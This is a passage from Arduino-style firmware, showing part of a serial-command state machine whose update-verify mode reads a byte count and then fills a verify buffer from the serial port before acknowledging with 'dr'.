				script_running = false;
			}

			break;

		// enter update verify buffer mode until all preset bytes are loaded
		case UPDATE_VERIFY:

			// if no args are set
			if(!update_verify_args_updated[0])
			{
				// block index
				while(Serial.available() > 0) 
				{
					size_str = Serial.readString();    
					update_size = size_str.toInt();
					delay(2);

					Serial.print(update_size,DEC);
					update_verify_args_updated[0] = true;
				}            
			}

			else
			{
				while(Serial.available() > 0) 
				{
					verify_buffer[verify_read_count] = Serial.read();
					verify_read_count++;
				}

				if(verify_read_count >= update_size)
				{
					done_reading_verify = true; 
				}      
			}

			if(done_reading_verify)
			{
				Serial.print("dr\n");
				verify_read_count = 0;
				mode = NOP;
				done_reading_verify = false;
				script_running = false;
			}

			break;

		// catch error state and do nothing
		default:
			break;
	}
}